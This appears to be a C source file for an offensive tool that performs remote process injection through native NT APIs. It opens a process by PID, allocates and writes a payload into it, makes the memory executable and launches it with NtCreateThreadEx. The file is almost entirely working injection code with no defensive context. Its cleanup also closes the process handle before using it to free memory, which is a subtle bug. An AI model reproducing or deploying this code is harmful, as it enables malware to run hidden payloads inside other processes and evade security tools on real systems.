#include "Injector.h"
#pragma comment(lib, "ntdll.lib")
VOID PrintBanner(VOID) {
    printf(
        "     _  ___________   ___  ____  ____       _         __  _                                    \n"
        "    / |/ /_  __/ _ | / _ \\/  _/ /  _/__    (_)__ ____/ /_(_)__  ___                           \n"
        "   /    / / / / __ |/ ___// /  _/ // _ \\  / / -_) __/ __/ / _ \\/ _ \\                        \n"
        "  /_/|_/ /_/ /_/ |_/_/  /___/ /___/_//_/_/ /\\__/\\__/\\__/_/\\___/_//_/                       \n"
        "                                    |___/                                                    \n\n"
    
    );
}


#define PRINT_ERROR(func, status) printf("%s failed: 0x%X\n", func, status)

BOOL NTAPIInjection(CONST DWORD PID, CONST PBYTE Payload, CONST SIZE_T PayloadSize) {
    BOOL      State = TRUE;
    PVOID     Buffer = NULL;
    HANDLE    ThreadHandle = NULL;
    HANDLE    ProcessHandle = NULL;
    HMODULE   NtdllHandle = NULL;
    DWORD     OldProtection = 0;
    SIZE_T    BytesWritten = 0;
    NTSTATUS  Status = 0;
    CLIENT_ID CID = { (HANDLE)PID, NULL };
    OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL };

    // Open the process
    Status = NtOpenProcess(&ProcessHandle, PROCESS_ALL_ACCESS, &OA, &CID);
    if (STATUS_SUCCESS != Status) {
        PRINT_ERROR("NtOpenProcess", Status);
        return FALSE;
    }

    // Allocate memory in the process
    Status = NtAllocateVirtualMemory(ProcessHandle, &Buffer, 0, &PayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (STATUS_SUCCESS != Status) {
        PRINT_ERROR("NtAllocateVirtualMemory", Status);
        State = FALSE;
        goto CLEANUP;
    }

    // Write payload to allocated memory
    Status = NtWriteVirtualMemory(ProcessHandle, Buffer, Payload, PayloadSize, &BytesWritten);
    if (STATUS_SUCCESS != Status) {
        PRINT_ERROR("NtWriteVirtualMemory", Status);
        State = FALSE;
        goto CLEANUP;
    }

    // Change memory protection to execute
    Status = NtProtectVirtualMemory(ProcessHandle, &Buffer, &PayloadSize, PAGE_EXECUTE_READ, &OldProtection);
    if (STATUS_SUCCESS != Status) {
        PRINT_ERROR("NtProtectVirtualMemory", Status);
        State = FALSE;
        goto CLEANUP;
    }

    // Create a thread to execute the payload
    Status = NtCreateThreadEx(&ThreadHandle, THREAD_ALL_ACCESS, NULL, ProcessHandle, Buffer, NULL, FALSE, 0, 0, 0, NULL);
    if (STATUS_SUCCESS != Status) {
        PRINT_ERROR("NtCreateThreadEx", Status);
        State = FALSE;
        goto CLEANUP;
    }

    printf("Thread successfully created\n");

CLEANUP:
    if (ProcessHandle) {
        NtClose(ProcessHandle);
        ProcessHandle = NULL;
    }

    if (ThreadHandle) {
        NtClose(ThreadHandle);
        ThreadHandle = NULL;
    }

    if (Buffer) {
        NtFreeVirtualMemory(ProcessHandle, &Buffer, &PayloadSize, MEM_RELEASE);
        Buffer = NULL;
    }

    return State;
}




